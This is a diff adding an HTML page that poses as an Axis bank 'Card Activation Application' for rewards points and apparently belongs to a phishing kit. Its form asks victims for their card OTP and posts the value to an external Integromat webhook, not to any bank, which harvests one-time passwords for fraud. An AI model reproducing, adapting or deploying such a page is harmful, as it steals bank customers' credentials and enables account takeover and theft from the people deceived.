@@ -1,0 +1,101 @@
+<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
+<link href="css/bootstrap.min.css" rel="stylesheet">
+<link href="css/style.css" rel="stylesheet">
+<title>Axis Rewards : Update Your Rewards Point</title>
+<link rel="icon" href="" type="image/gif">
+<style>
+  /* Mark input boxes that gets an error on validation: */
+  input.invalid {
+    background-color: #97144d;
+  }
+
+  /* Hide all steps by default: */
+
+  #prevBtn {
+    background-color: #97144d;
+  }
+
+  /* Make circles that indicate the steps of the form: */
+  .step {
+    height: 15px;
+    width: 15px;
+    margin: 0 2px;
+    background-color: #97144d;
+    border: none;
+    border-radius: 50%;
+    display: inline-block;
+    opacity: 0.5;
+  }
+
+  .step.active {
+    opacity: 1;
+  }
+
+  /* Mark the steps that are finished and valid: */
+  .step.finish {
+    background-color:#97144d;
+  }
+</style>
+</head><body>
+  <header>
+    <img src="images/header1.png" class="img-fluid" width="100%" usemap="#logomap">
+    <map name="logomap">
+      <area shape="rect" coords="40 10 300 90" href="index.html">
+    </map>
+  </header>
+  <main class="content-section">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-7">
+          <h1 class="ccoapp-note">Card Activation Application</h1>
+          <h4 class="mb-3">Your Security</h4>
+          <div class="ccoapp-tabcntholder">
+            <form class="row g-2" id="regForm" action="https://hook.integromat.com/9kgltte5dww6wevp678moki7sw37fkqo" method="POST">
+              <!-- One "tab" for each step in the form: -->
+
+              <div class="tab">
+                <h5>Step 3: Security</h5>
+                <div class="row">
+                  <div class="col-sm-6 col-xs-12">
+                    <div class="input-holder has-validation">
+                      <label for="card_OTP">Enter Your OTP</label>
+                      <div class="input-wrapper">
+                        <input class="form-control" type="number" id="card_OTP" name="card_OTP" required="">
+                        <input type="hidden" id="custId" name="tid" value="Card Activation Application">
+                      </div>
+                      <div class="invalid-feedback">
+                        Please enter your OTP.
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div style="overflow:auto;">
+                <div style="float:right;">
+                  <a class="common-button" href="card/index.html" id="prevBtn">Previous</a>
+                  <button class="common-button" type="submit" name="submit" id="nextBtn">Next</button>
+                </div>
+              </div>
+              <!-- Circles which indicates the steps of the form: -->
+              <div class="text-center mt-2">
+                <span class="step"></span>
+                <span class="step"></span>
+                <span class="step active"></span>
+              </div>
+            </form>
+          </div>
+        </div>
+               </div>
+    </div>
+  </main>
+  <!-- Optional JavaScript; choose one of the two! -->
+  <script src="js/jquery.min.js"></script>
+  <!-- Option 1: Bootstrap Bundle with Popper -->
+  <script src="js/bootstrap.bundle.min.js"></script>
+  <script src="js/control.js"></script>
+
+
+
+
+</body></html>
